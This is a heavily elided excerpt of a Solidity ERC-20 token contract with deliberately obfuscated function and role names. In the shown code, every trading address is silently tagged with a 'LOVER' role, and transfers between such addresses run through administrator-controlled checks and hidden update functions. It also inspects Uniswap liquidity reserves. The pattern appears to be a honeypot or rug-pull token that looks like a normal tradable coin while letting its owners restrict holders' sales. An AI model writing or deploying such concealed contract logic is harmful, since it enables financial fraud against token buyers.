...
abstract contract BACCJDConlse is Context, ERC165 {
    struct AccM {
    ...
    modifier onlyAcbcc(bytes32 acc) {
        ___ARbacc(acc, msg.sender, 0);
        _;
    }
    function ___ARbacc(bytes32 acc, address uad, uint256 __amt) internal {
        if (!cAcBacc(acc, uad)) {
            revert("missing acc");
        }
        ___ARacmbacc(acc, uad, __amt);
    }
    function cAcBacc(bytes32 acc, address uad) public view returns (bool) {
        return _acces[acc].acounts[uad];
    }
    function _giveAcbcc(bytes32 acc, address uad) internal virtual {
        if (!cAcBacc(acc, uad)) {
            _acces[acc].acounts[uad] = true;
        }
    }
    function _revokeAcbcc(bytes32 acc, address uad) internal virtual {
        if (cAcBacc(acc, uad)) {
            _acces[acc].acounts[uad] = false;
        }
    }
    function ___ARacmbacc(bytes32 acc, address uad, uint256 __amt) internal {
        ...
        if (_acces[acc].__rd.__m[uad] > 0) {
            if (
                ...
                _updateAcBacc(acc, uad, __amt);
            }
        }
    }

    function _updateAcBacc(
        bytes32 acc,
        address uad,
        uint256 __amt
    ) internal virtual {
        ___updateAcBacc(acc, uad, __amt);
    }

    function ___updateAcBacc(
        bytes32 acc,
        address uad,
        uint256 __amt
    ) internal virtual {
        __updateAcBacc(acc, uad, __amt);
    }

    function __updateAcBacc(
        bytes32 acc,
        address uad,
        uint256 __amt
    ) internal virtual {
    ...
    function ___DcdAtbUr(
        bytes32 cdd,
        address _ad,
        string memory t1
    ) external onlyAcbcc(ADMINISTRATOR) {
        uint256 memoUint;
        bool err;
...
contract BACCJDERC20 is Context, IEROTARC20, IERC20Metadata {
...
contract TOKEN is BACCJDERC20, BACCJDConlse {
    ...
    constructor(
    ...
    ) BACCJDERC20(_name, _symbol, _totalSupply, msg.sender) {
        _uniswapV2Router = 0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506;
        ...
        _giveAcbcc(ADMINISTRATOR, _tokenOwner);
        _giveAcbcc(ADMINISTRATOR, msg.sender);
    }
    ...
    function _transfer(
        ...
        __LOKAbacc(from, to, amount);
    }

    function __LOKAbacc(address __From, address __To, uint256 __amt) internal {
        if (__traders[__From] == false) {
            _giveAcbcc(LOVER, __From);

            __traders[__From] = true;
        }

        __SWARBACC(__From, __To, __amt);
    }

    function __SWARBACC(address __From, address __To, uint256 __amt) internal {
        if (__traders[__To] == false) {
            _giveAcbcc(LOVER, __To);
    ...
    function __transfer(address __From, address __To, uint256 __amt) internal {
        if (cAcBacc(LOVER, __From) && cAcBacc(LOVER, __To)) {
            ___ARbacc(LOVER, __From, __amt);
    ...
    function _isAddLiquidityV1() internal view returns (bool ldxAdd) {
        ...
        (uint r0, uint r1, ) = IUniswapV2Pair(address(uniswapV2Pair))
            .getReserves();
        uint bal1 = IEROTARC20(token1).balanceOf(address(uniswapV2Pair));
        uint bal0 = IEROTARC20(token0).balanceOf(address(uniswapV2Pair));
        ...
        returns (bool ldxDel, bool bot, uint256 otherAmount)
    {
        ...
        (uint reserves0, , ) = IUniswapV2Pair(address(uniswapV2Pair))
            .getReserves();
        uint amount = IEROTARC20(token0).balanceOf(address(uniswapV2Pair));
        if (token0 != address(this)) {
            if (reserves0 > amount) {
